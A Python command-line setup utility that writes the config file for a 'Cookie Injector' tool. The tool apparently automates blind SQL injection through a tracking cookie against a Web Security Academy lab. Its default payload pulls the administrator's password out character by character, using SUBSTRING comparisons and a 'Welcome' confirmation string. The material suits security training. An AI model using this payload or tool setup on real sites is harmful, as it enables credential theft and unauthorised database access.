#!/usr/bin/env python3.12
# cookie_injector_setup.py ver 9.0
import json
import os.path
import string
import sys
import time
from types import SimpleNamespace

import validators
from rich.console import Console
from rich.markdown import Markdown
from rich.panel import Panel
from rich.prompt import Prompt
from rich.text import Text
from rich.tree import Tree

c = Console()

# option = {
#     "target_url": "https://0aa900cf039b09fc83a9d2ff00f100ad.web-security-academy.net/product?productId=3",
#     "inject_code": "' anD (SELECT SUBSTRING(password,{char_numb},1) FROM users WHERE username = 'administrator') = '{character}'--",
#     "passwd_length": 20,
#     "char_set": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
#     "confirm_string": "Welcome",
#     "cookie_name": "TrackingId",
#     "max_threads": 20
# }


from pathlib import Path


class CookieInjSetup:
    def __init__(self, config_file_path: Path = "config/cookie_injector.json"):
        self.config_file_path = config_file_path
        self.c = Console()
        self.p = Prompt()
        self.options = {}
        self.config_file_content = None
        self.confirm = None
        self.setup_done = False

    def load_header(self):
        print()
        self.c.rule(f"", align="center", characters="#", style="black")
        self.c.rule(f"", align="center", characters="#", style="black")
        self.c.print(Markdown(f"# Cookie Injector Setup"))
        self.c.rule(f"", align="center", characters="#", style="black")
        self.c.rule(f"", align="center", characters="#", style="black")
        print()

    def load_setup(self):
        self.load_header()
        intro_message = Text(
            "Cookie Injector configuration utility.\n"
            "It creates a file called 'cookie_injector.json' in the current working directory.\n"
            "Once created Cookie Injector will just run without parameters.\n"
            f"Any updates to the parameters can be done editing the config file: '{self.config_file_path}'",
            justify="left"
        )
        self.c.print(Panel(intro_message, title="Info", title_align="left"))
        print()
        self.setup_done = True

    def validate_url(self, option_obj):
        try:
            url_is_valid = validators.url(self.options[option_obj.name])
        except OverflowError:
            return False
        if url_is_valid:
            return True
        else:
            return False

    def validate_int(self, option_obj):
        evaluate_integer = self.options[option_obj.name]
        try:
            if not 1 <= int(evaluate_integer) <= 24:
                return False
        except (TypeError, ValueError):
            return False
        else:
            return True

    def validate_input_data(self, option_obj):
        option_type = option_obj.type
        if option_type == "url":
            return self.validate_url(option_obj)
        elif option_type == "str":
            return True
        elif option_type == "int":
            return self.validate_int(option_obj)

    def set_corrected_option(self, option_obj):
        if "default_choice" not in vars(option_obj):
            self.set_option(option_obj)
        else:
            self.set_option(option_obj, custom=True)

    def elaborate_quit(self, quit_app, option_obj):
        if quit_app == "quit" or quit_app == "q":
            sys.exit("Bye.")
        else:
            self.set_corrected_option(option_obj)
            return

    def validate_choice(self, option_obj):
        if self.confirm == 'n':
            exit_message = "Edit option or quit app"
            quit_app = self.p.ask(
                exit_message,
                console=self.c,
                default="edit",
                choices=["edit", "e", "quit", "q"],
                show_default=True,
                show_choices=True
            )
            self.elaborate_quit(quit_app, option_obj)
        else:
            return

    def set_option(self, option_obj: SimpleNamespace, custom=False):
        with self.c.screen():
            self.load_setup()
            if custom is False:
                option_name_value = self.p.ask(option_obj.message, console=self.c)
            else:
                option_name_value = self.p.ask(
                    option_obj.message,
                    console=self.c,
                    default=option_obj.default_choice,
                    show_default=True
                )
            try:
                self.options[f"{option_obj.name}"] = int(option_name_value)
            except ValueError:
                self.options[f"{option_obj.name}"] = option_name_value

            while self.validate_input_data(option_obj) is not True:
                self.c.print(
                    Panel(
                        f"{option_obj.name}: {self.options[option_obj.name]}\n"
                        f"{option_obj.name.capitalize()} ok: {self.validate_input_data(option_obj)}\n"
                        f"Enter a valid {option_obj.type} value.",
                        highlight=True
                    ))
                time.sleep(2)
                if "default_choice" not in vars(option_obj):
                    self.set_option(option_obj)
                    return
                else:
                    self.set_option(option_obj, custom=True)
                    return
            else:
                self.c.print(
                    Panel(
                        f"{option_obj.name}: {self.options[option_obj.name]}\n"
                        f"{option_obj.name.capitalize()} ok: {self.validate_input_data(option_obj)}",
                        highlight=True
                    )
                )
                # self.c.print(f"{option_obj.name}: {self.options[option_obj.name]}")
                # self.c.print(f"{option_obj.name.capitalize()} ok: {self.validate_input_data(option_obj)}")
            # self.c.print(Panel(option_obj.show_message.replace("§tag_1§", str(self.options.get(option_obj.name)))))
            self.confirm = self.p.ask(
                option_obj.confirm_text,
                default="y",
                choices=["y", "n"],
                show_choices=True,
                show_default=True,
            )
            self.validate_choice(option_obj)

    def parse_options(self):
        # with self.c.screen():
        if not self.setup_done:
            self.load_setup()

        # Target URL.
        target_url = SimpleNamespace()
        target_url.name = "target_url"
        target_url.message = "Enter the target url"
        target_url.show_message = f"Target url: §tag_1§"
        target_url.confirm_text = "Is the url correct?"
        target_url.type = "url"
        self.set_option(target_url)

        # Inject code.
        inject_code = SimpleNamespace()
        inject_code.name = "inject_code"
        inject_code.message = "Code you want to inject in the cookie"
        inject_code.default_choice = (
            "' anD (SELECT SUBSTRING(password,{char_numb},1) "
            "FROM users WHERE username = 'administrator') = '{character}'--"
        )
        inject_code.show_message = f"Inject code: §tag_1§"
        inject_code.confirm_text = "Is the code correct?"
        inject_code.type = "str"
        self.set_option(inject_code, custom=True)

        # Password length.
        passwd_length = SimpleNamespace()
        passwd_length.name = "passwd_length"
        passwd_length.message = "Length of the password you want to recover"
        passwd_length.show_message = f"Password length: §tag_1§"
        passwd_length.confirm_text = "Is the password length correct?"
        passwd_length.type = "int"
        self.set_option(passwd_length)

        # Char set.
        char_set = SimpleNamespace()
        char_set.name = "char_set"
        char_set.message = "Enter the character set you want to use"
        char_set.default_choice = string.ascii_letters + "".join(str(i) for i in range(10))
        char_set.show_message = f"Characters set: §tag_1§"
        char_set.confirm_text = "Is the char-set correct?"
        char_set.type = "str"
        self.set_option(char_set, custom=True)

        # Confirm string.
        confirm_string = SimpleNamespace()
        confirm_string.name = "confirm_string"
        confirm_string.message = f"String to confirm True statements"
        confirm_string.show_message = f"Confirmation string: §tag_1§"
        confirm_string.confirm_text = "Is the confirmation string correct?"
        confirm_string.type = "str"
        self.set_option(confirm_string)

        # Cookie name.
        cookie_name = SimpleNamespace()
        cookie_name.name = "cookie_name"
        cookie_name.message = f"Name of the cookie to inject"
        cookie_name.show_message = f"Cookie name: §tag_1§"
        cookie_name.confirm_text = "Is the cookie name correct?"
        cookie_name.type = "str"
        self.set_option(cookie_name)

        # Max threads.
        max_threads = SimpleNamespace()
        max_threads.name = "max_threads"
        max_threads.message = f"Number of concurrent threads for the requests"
        max_threads.show_message = f"Max threads: §tag_1§"
        max_threads.confirm_text = "Is the max-thread value correct?"
        max_threads.type = "int"
        self.set_option(max_threads)

        # Exit screen.
        self.exit_screen()

    def load_configuration_data_header(self):
        print()
        self.c.rule("", characters="#", style="black")
        self.c.rule("Configuration File Data", style="black")
        self.c.rule("", characters="#", style="black")
        self.c.rule("", characters="#", style="black")
        print()

    def exit_screen(self):
        with self.c.screen():
            self.load_header()
            tree = Tree(
                "Cookie Injector Configuration Data", highlight=True, )
            for k, v in self.options.items():
                tree.add(f"{k}: {v}")
            self.load_configuration_data_header()
            self.c.print(Panel(tree, title="Data Tree", title_align="left", highlight=True))
            print()
            self.c.print(f"You can edit the settings directly in the file {self.config_file_path}.")
            read_conf_file = self.p.ask(
                "Save the changes and check config file content?",
                choices=["y", "n"],
                default="y",
                show_default=True,
                show_choices=True
            )
            if read_conf_file == "y":
                self.write_config_file()
                self.read_config_file()
                with self.c.screen():
                    self.c.print(Markdown("# Configuration File"))
                    self.c.print(self.config_file_content)
                    self.p.ask("Press (ENTER) to exit")
                self.c.print(Markdown("# Configuration File"))
                self.c.print(self.config_file_content)
            else:
                message = "Quit or start over"
                quit_app = self.p.ask(
                    message,
                    console=self.c,
                    default="quit",
                    choices=["quit", "start-over"],
                    show_default=True,
                    show_choices=True
                )
                if quit_app == "quit":
                    sys.exit("Bye.")
                else:
                    self.parse_options()

    def read_config_file(self):
        with open(self.config_file_path, "r") as config_file:
            self.config_file_content = json.loads(config_file.read())

    def write_config_file(self):
        if os.path.exists(self.config_file_path):
            with self.c.screen():
                self.load_setup()
                message = f"Are you sure you want to overwrite the existing config file? {self.config_file_path}"
                overwrite = self.p.ask(
                    message, console=self.c, choices=["y", "n"], show_choices=True, show_default=True,
                    default="y"
                )
                if overwrite == "n":
                    self.c.print("e", self.config_file_path)
                    with open(self.config_file_path, "r") as config_file:
                        # original_config_file = json.loads(config_file.read())
                        self.c.print(Markdown("# Original Config File"))
                        self.read_config_file()
                        self.c.print(self.config_file_content)
                        # self.c.print(original_config_file)
                        self.p.ask("Press (Enter) to quit", console=self.c, )
                    sys.exit("Exiting.")
        with open(self.config_file_path, "w") as config_file:
            config_file.write(json.dumps(self.options))


def main():
    setup = CookieInjSetup()
    setup.parse_options()
    # setup.write_config_file()


if __name__ == '__main__':
    main()
